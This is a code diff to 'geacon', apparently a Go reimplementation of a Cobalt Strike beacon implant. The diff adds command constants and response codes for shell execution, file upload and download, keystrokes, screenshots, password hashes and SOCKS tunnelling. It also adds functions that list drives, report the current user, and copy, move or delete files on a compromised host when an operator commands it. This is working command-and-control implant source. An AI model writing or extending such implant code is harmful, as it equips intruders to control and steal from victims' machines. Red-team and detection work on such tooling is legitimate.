@@ -5,28 +5,65 @@ import (
 	"encoding/binary"
 	"fmt"
 	"geacon/cmd/util"
+	"io"
 	"io/ioutil"
 	"os"
 	"os/exec"
+	"os/user"
 	"path/filepath"
 	"runtime"
 	"strings"
+
+	"github.com/shirou/gopsutil/v3/disk"
 )
 
 const (
-	CMD_TYPE_SLEEP        = 4
-	CMD_TYPE_DATA_JITTER  = 6
-	CMD_TYPE_CHECKIN	  = 8
-	CMD_TYPE_SHELL        = 78
-	CMD_TYPE_UPLOAD_START = 10
-	CMD_TYPE_UPLOAD_LOOP  = 67
-	CMD_TYPE_DOWNLOAD     = 11
-	CMD_TYPE_EXIT         = 3
-	CMD_TYPE_CD           = 5
-	CMD_TYPE_PWD          = 39
-	CMD_TYPE_FILE_BROWSE  = 53
-	CMD_TYPE_RM			  = 56
-	CMD_TYPE_LIST_PROCESS = 32
+	CMD_TYPE_SLEEP        = 4		// IMPLEMENTED 
+	CMD_TYPE_DATA_JITTER  = 6		// TODO
+	CMD_TYPE_CHECKIN	  = 8		// WONTFIX: only required for DNS beacons
+	CMD_TYPE_SHELL        = 78		// IMPLEMENTED
+	CMD_TYPE_UPLOAD_START = 10		// IMPLEMENTED
+	CMD_TYPE_UPLOAD_LOOP  = 67		// IMPLEMENTED
+	CMD_TYPE_DOWNLOAD     = 11		// IMPLEMENTED
+	CMD_TYPE_EXIT         = 3		// IMPLEMENTED
+	CMD_TYPE_CD           = 5		// IMPLEMENTED
+	CMD_TYPE_PWD          = 39		// IMPLEMENTED
+	CMD_TYPE_FILE_BROWSE  = 53		// IMPLEMENTED
+	CMD_TYPE_RM			  = 56		// IMPLEMENTED
+	CMD_TYPE_LIST_PROCESS = 32		// TODO
+	CMD_TYPE_GETUID		  = 27		// IMPLEMENTED
+	CMD_TYPE_CP			  = 73		// IMPLEMENTED
+	CMD_TYPE_MV			  = 74		// IMPLEMENTED
+	CMD_TYPE_IP_CONFIG	  = 48		// TODO
+	CMD_TYPE_DRIVES		  = 55		// IMPLEMENTED
+
+	BEACON_RSP_OUTPUT_KEYSTROKES	    = 1
+	BEACON_RSP_DOWNLOAD_START	        = 2
+	BEACON_RSP_OUTPUT_SCREENSHOT	    = 3
+	BEACON_RSP_SOCKS_DIE	            = 4
+	BEACON_RSP_SOCKS_WRITE	            = 5
+	BEACON_RSP_SOCKS_RESUME	        	= 6
+	BEACON_RSP_SOCKS_PORTFWD	        = 7
+	BEACON_RSP_DOWNLOAD_WRITE	        = 8
+	BEACON_RSP_DOWNLOAD_COMPLETE	    = 9
+	BEACON_RSP_BEACON_LINK	            = 10
+	BEACON_RSP_DEAD_PIPE	            = 11
+	BEACON_RSP_BEACON_CHECKIN	        = 12
+	BEACON_RSP_BEACON_ERROR	        	= 13
+	BEACON_RSP_PIPES_REGISTER	        = 14
+	BEACON_RSP_BEACON_IMPERSONATED	    = 15
+	BEACON_RSP_BEACON_GETUID	        = 16
+	BEACON_RSP_BEACON_OUTPUT_PS	    	= 17
+	BEACON_RSP_ERROR_CLOCK_SKEW	    	= 18
+	BEACON_RSP_BEACON_GETCWD	        = 19
+	BEACON_RSP_BEACON_OUTPUT_JOBS	    = 20
+	BEACON_RSP_BEACON_OUTPUT_HASHES		= 21
+	BEACON_RSP_FILE_BROWSE_RESULT      	= 22
+	BEACON_RSP_SOCKS_ACCEPT	        	= 23
+	BEACON_RSP_BEACON_OUTPUT_NET	    = 24
+	BEACON_RSP_BEACON_OUTPUT_PORTSCAN	= 25
+	BEACON_RSP_BEACON_EXIT	            = 26
+	BEACON_RSP_OUTPUT	                = 30
 )
 
 func ParseCommandShell(b []byte) (string, []byte) {
@@ -134,9 +171,88 @@ func GetCurrentDirectory() []byte {
 }
 
 func RemoveFile(path []byte) {
-	err := os.Remove(path)
+	err := os.Remove(string(path))
 	if err != nil {
 		processErrorTest(err.Error())
+	}
+}
+
+func ListDrives() []byte {
+	partitions, err := disk.Partitions(true)
+	if err != nil {
+		processErrorTest(err.Error())
+		return nil
+	}
+
+	var sb strings.Builder
+
+	for _, partition := range partitions {
+		sb.WriteString(fmt.Sprintf("%s\n", partition.Mountpoint))
+	}
+
+	return []byte(sb.String())
+}
+
+func GetUid() []byte {
+	userDetails, err := user.Current()
+	if err != nil {
+		processErrorTest(err.Error())
+		return nil
+	}
+	result := fmt.Sprintf("%s (uid=%s, gid=%s)\n", userDetails.Username, userDetails.Uid, userDetails.Gid)
+	return []byte(result)
+}
+
+func ParseCommandCopyMove(b []byte) ([]byte, []byte) {
+	buf := bytes.NewBuffer(b)
+	fromPathLenBytes := make([]byte, 4)
+	_, err := buf.Read(fromPathLenBytes)
+	if err != nil {
+		panic(err)
+	}
+	fromPathLen := ReadInt(fromPathLenBytes)
+	fromPath := make([]byte, fromPathLen)
+	_, err = buf.Read(fromPath)
+	if err != nil {
+		panic(err)
+	}
+
+	toPathLenBytes := make([]byte, 4)
+	_, err = buf.Read(toPathLenBytes)
+	if err != nil {
+		panic(err)
+	}
+
+	toPathLen := ReadInt(toPathLenBytes)
+	toPath := make([]byte, toPathLen)
+	buf.Read(toPath)
+
+	return fromPath, toPath
+}
+
+func CopyFile(fromPath, toPath []byte) {
+	in, err := os.Open(string(fromPath))
+    if err != nil {
+        fmt.Printf("File Open error: %s\n", err)
+    }
+    defer in.Close()
+
+    out, err := os.Create(string(toPath))
+    if err != nil {
+        fmt.Printf("File Open error: %s\n", err)
+    }
+    defer out.Close()
+
+    _, err = io.Copy(out, in)
+    if err != nil {
+        fmt.Printf("File Copy error: %s\n", err)
+    }
+}
+
+func MoveFile(oldLocation, newLocation []byte) {
+	err := os.Rename(string(oldLocation), string(newLocation))
+	if err != nil {
+		fmt.Printf("File Move error: %s\n", err)
 	}
 }
 
